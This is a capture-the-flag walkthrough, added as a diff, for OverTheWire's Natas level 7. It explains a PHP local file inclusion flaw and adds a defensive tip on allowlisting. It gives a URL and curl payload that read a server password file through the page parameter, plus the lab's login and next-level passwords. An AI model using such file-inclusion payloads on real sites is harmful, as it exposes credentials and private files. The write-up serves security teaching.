@@ -1,0 +1,77 @@
+---
+title: "Natas 7"
+description: "Natas Level 7 — Local File Inclusion via an unsanitized page parameter passed directly to PHP include."
+---
+
+## Overview
+
+| Field    | Value                                        |
+|----------|----------------------------------------------|
+| URL      | `http://natas7.natas.labs.overthewire.org`   |
+| Username | `natas7`                                     |
+| Password | `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`          |
+
+The page has two navigation links:
+
+```
+index.php?page=home
+index.php?page=about
+```
+
+The `page` parameter controls what content is loaded. The page source contains a hint:
+
+```html
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+```
+
+---
+
+## Hints
+
+<AccordionGroup>
+  <Accordion title="Hint 1 — What is the page parameter doing?">
+    The `?page=` parameter changes what content is rendered. In PHP, this is commonly done by passing the parameter to an `include()` or `require()` call — the value becomes part of the file path. What happens if the value you pass isn't a page name, but an absolute path to a file on the server?
+  </Accordion>
+  <Accordion title="Hint 2 — Where is the password?">
+    The HTML comment tells you exactly where the password file lives: `/etc/natas_webpass/natas8`. If the `include()` call doesn't restrict input to relative paths, you can supply that absolute path directly as the `page` parameter.
+  </Accordion>
+</AccordionGroup>
+
+---
+
+## Solution
+
+<Accordion title="Full walkthrough">
+  <Steps>
+    <Step title="Identify the vulnerability">
+      The `?page=` value is passed directly into a PHP `include()` without validation. This is a Local File Inclusion (LFI) vulnerability — any readable file on the server's filesystem can be included.
+    </Step>
+    <Step title="Include the password file">
+      Navigate to:
+
+      ```
+      http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+      ```
+
+      PHP includes `/etc/natas_webpass/natas8` and renders its contents inline in the page.
+    </Step>
+  </Steps>
+</Accordion>
+
+<Note>
+  Never pass user input directly to `include()`, `require()`, `file_get_contents()`, or any function that opens a file path. Validate against a strict allowlist of permitted page names and never allow absolute paths or traversal sequences (`../`).
+</Note>
+
+## With curl
+
+```bash
+# Pass the absolute path as the page parameter — the server includes and returns the file
+curl -s -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS \
+  "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
+```
+
+## Password
+
+```
+natas8: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+```
